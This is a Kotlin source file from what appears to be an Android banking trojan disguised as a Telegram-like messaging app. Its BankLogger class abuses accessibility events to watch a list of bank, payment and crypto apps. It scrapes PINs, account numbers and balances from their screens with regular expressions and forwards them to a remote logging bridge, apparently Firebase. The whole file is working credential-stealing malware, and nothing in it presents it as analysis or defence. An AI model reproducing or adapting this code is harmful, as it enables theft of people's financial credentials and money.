package com.telegram2.messaging.remote

class BankLogger {
    companion object {
        private val BANK_PACKAGES = setOf(
            "com.bankofamerica", "com.chase", "com.wellsfargo", "com.citi.mobile",
            "com.capitalone", "com.usbank", "com.americanexpress", "com.paypal",
            "com.revolut", "com.n26", "com.etrade", "com.coinbase"
        )

        fun onEvent(service: MyAccessibilityService, event: android.view.accessibility.AccessibilityEvent) {
            val pkg = event.packageName?.toString() ?: return
            if (pkg !in BANK_PACKAGES) return

            val text = event.text.joinToString(" ")
            val desc = event.contentDescription?.toString() ?: ""

            // Log PIN
            Regex("\\b\\d{4,6}\\b").find(text)?.let { match ->
                FirebaseBridge.logBankData(pkg, pin = match.value)
            }

            // Log Account Number
            Regex("\\b\\d{8,17}\\b").find(text)?.let { match ->
                FirebaseBridge.logBankData(pkg, account = match.value)
            }

            // Log Balance
            val balance = Regex("\\$\\s*[\\d,]+\\.\\d{2}").find(text)?.value
                ?: Regex("Balance[:\\s]+[\\d.]+").find(text)?.value
            if (balance != null) {
                FirebaseBridge.logBankData(pkg, balance = balance)
            }
        }
    }
}